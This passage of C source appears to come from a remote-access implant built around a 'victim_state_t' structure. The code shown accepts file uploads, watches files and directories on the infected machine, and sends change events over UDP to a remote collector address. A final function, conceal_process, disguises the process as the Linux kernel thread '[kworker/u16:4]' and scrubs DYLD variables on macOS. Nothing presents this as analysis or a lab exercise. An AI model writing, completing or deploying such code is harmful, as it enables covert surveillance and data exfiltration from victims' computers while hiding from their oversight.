    if (state->upload_fp == NULL) {
        snprintf(message, message_len, "file upload failed: no active upload");
        return -1;
    }

    snprintf(completed_path, sizeof(completed_path), "%s", state->upload_path);
    fclose(state->upload_fp);
    state->upload_fp = NULL;

    if (rename(state->upload_temp_path, state->upload_path) != 0) {
        snprintf(message, message_len, "file upload failed: rename: %s", strerror(errno));
        remove(state->upload_temp_path);
        state->upload_temp_path[0] = '\0';
        state->upload_path[0] = '\0';
        return -1;
    }

    state->upload_temp_path[0] = '\0';
    state->upload_path[0] = '\0';
    snprintf(message, message_len, "stored file at %s", completed_path);
    return 0;
}

static int watch_remote_file(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len) {
    watch_state_t watch;
    char path[REMOTE_PATH_MAX];
    char error[RESPONSE_TEXT_MAX];

    if (copy_payload_string(payload, payload_len, "remote file path", path, sizeof(path), error, sizeof(error)) != 0) {
        snprintf(message, message_len, "file watch failed: %s", error);
        return -1;
    }

    memset(&watch, 0, sizeof(watch));
    if (snapshot_file_watch(path, &watch) != 0) {
        snprintf(message, message_len, "file watch failed: cannot access %s", path);
        return -1;
    }

    watch.active = 1;
    snprintf(watch.path, sizeof(watch.path), "%s", path);
    state->file_watch = watch;
    snprintf(message, message_len, "watching file %s", state->file_watch.path);
    return 0;
}

static int watch_remote_directory(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len) {
    watch_state_t watch;
    char path[REMOTE_PATH_MAX];
    char error[RESPONSE_TEXT_MAX];

    if (copy_payload_string(payload, payload_len, "remote directory path", path, sizeof(path), error, sizeof(error)) != 0) {
        snprintf(message, message_len, "directory watch failed: %s", error);
        return -1;
    }

    memset(&watch, 0, sizeof(watch));
    if (snapshot_directory_watch(path, &watch) != 0) {
        snprintf(message, message_len, "directory watch failed: cannot access %s", path);
        return -1;
    }

    watch.active = 1;
    snprintf(watch.path, sizeof(watch.path), "%s", path);
    state->directory_watch = watch;
    snprintf(message, message_len, "watching directory %s", state->directory_watch.path);
    return 0;
}

static int snapshot_file_watch(const char *path, watch_state_t *watch) {
    struct stat st;

    if (stat(path, &st) != 0 || !S_ISREG(st.st_mode)) {
        return -1;
    }

    watch->exists = 1;
    watch->mtime = st.st_mtime;
    watch->size = st.st_size;
    return 0;
}

static int snapshot_directory_watch(const char *path, watch_state_t *watch) {
    int exists = 0;
    time_t mtime = 0;
    uint64_t signature;

    signature = compute_directory_signature(path, &exists, &mtime);
    if (!exists) {
        return -1;
    }

    watch->exists = 1;
    watch->mtime = mtime;
    watch->signature = signature;
    return 0;
}

static uint64_t compute_directory_signature(const char *path, int *exists, time_t *mtime) {
    DIR *dir;
    struct dirent *entry;
    struct stat dir_stat;
    uint64_t hash = 1469598103934665603ULL;
    char **names = NULL;
    size_t count = 0;
    size_t capacity = 0;

    *exists = 0;
    *mtime = 0;

    if (stat(path, &dir_stat) != 0 || !S_ISDIR(dir_stat.st_mode)) {
        return 0;
    }

    dir = opendir(path);
    if (dir == NULL) {
        return 0;
    }

    *exists = 1;
    *mtime = dir_stat.st_mtime;

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }
        if (count >= capacity) {
            size_t new_cap = capacity == 0 ? 64 : capacity * 2;
            char **new_names = realloc(names, sizeof(char *) * new_cap);
            if (new_names == NULL) {
                break;
            }
            names = new_names;
            capacity = new_cap;
        }
        names[count] = strdup(entry->d_name);
        if (names[count] == NULL) {
            break;
        }
        count++;
    }
    closedir(dir);

    if (count > 0 && names != NULL) {
        qsort(names, count, sizeof(char *), (int (*)(const void *, const void *))strcmp);
    }

    for (size_t i = 0; i < count; i++) {
        char child_path[REMOTE_PATH_MAX * 2];
        struct stat st;
        const unsigned char *name = (const unsigned char *)names[i];

        while (*name != '\0') {
            hash ^= *name++;
            hash *= 1099511628211ULL;
        }

        if ((size_t)snprintf(child_path, sizeof(child_path), "%s/%s", path, names[i]) >= sizeof(child_path)) {
            continue;
        }

        if (stat(child_path, &st) == 0) {
            hash ^= (uint64_t)st.st_mtime;
            hash *= 1099511628211ULL;
            hash ^= (uint64_t)st.st_size;
            hash *= 1099511628211ULL;
            hash ^= (uint64_t)st.st_mode;
            hash *= 1099511628211ULL;
        }
    }

    for (size_t i = 0; i < count; i++) {
        free(names[i]);
    }
    free(names);

    return hash;
}

static void send_watch_event(victim_state_t *state, const char *label, const char *path, const char *details) {
    char payload[FILE_CHUNK];

    if (!state->session_active) {
        return;
    }

    snprintf(payload, sizeof(payload), "%s: %s (%s)", label, path, details);
    (void)send_watch_message(&state->allowed_addr, payload, (int)strnlen(payload, sizeof(payload)));
}

static int copy_payload_string(const uint8_t *payload, uint16_t payload_len, const char *field_name, char *out, size_t out_len, char *error, size_t error_len) {
    size_t string_len;

    if (payload == NULL || payload_len == 0) {
        snprintf(error, error_len, "missing %s", field_name);
        return -1;
    }

    string_len = bounded_strlen(payload, payload_len);
    if (string_len == payload_len) {
        snprintf(error, error_len, "%s is not NUL terminated", field_name);
        return -1;
    }

    if (string_len >= out_len) {
        snprintf(error, error_len, "%s too long", field_name);
        return -1;
    }

    memcpy(out, payload, string_len + 1);
    return 0;
}

static size_t bounded_strlen(const uint8_t *data, size_t limit) {
    size_t len = 0;

    while (len < limit && data[len] != '\0') {
        len++;
    }

    return len;
}

static int send_watch_message(const struct in_addr *target_addr, const char *payload, int payload_len) {
    int sock;
    struct sockaddr_in target;
    network_message_t message;
    ssize_t sent;
    size_t copy_len;

    memset(&message, 0, sizeof(message));
    message.message_type = MSG_DIRECTORY_EVENT;
    copy_len = (size_t)payload_len < sizeof(message.payload) ? (size_t)payload_len : sizeof(message.payload) - 1;
    memcpy(message.payload, payload, copy_len);
    message.payload_len = (int)copy_len;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        return -1;
    }

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_addr = *target_addr;
    target.sin_port = htons(COLLECTOR_PORT);

    sent = sendto(sock, &message, sizeof(message), 0, (const struct sockaddr *)&target, sizeof(target));
    close(sock);

    if (sent != (ssize_t)sizeof(message)) {
        return -1;
    }

    return 0;
}

static void conceal_process(void) {
#ifdef __linux__
    const char *chosen = "[kworker/u16:4]";
    (void)prctl(PR_SET_NAME, chosen, 0, 0, 0);
#endif
#ifdef __APPLE__
    extern char **environ;
    for (char **env = environ; *env != NULL; env++) {
        if (strncmp(*env, "DYLD_INSERT_LIBRARIES=", 22) == 0) {
            *env = "DYLD_INSERT_LIBRARIES=";
        }
        if (strncmp(*env, "DYLD_LIBRARY_PATH=", 18) == 0) {
            *env = "DYLD_LIBRARY_PATH=";
        }
    }
#endif
}
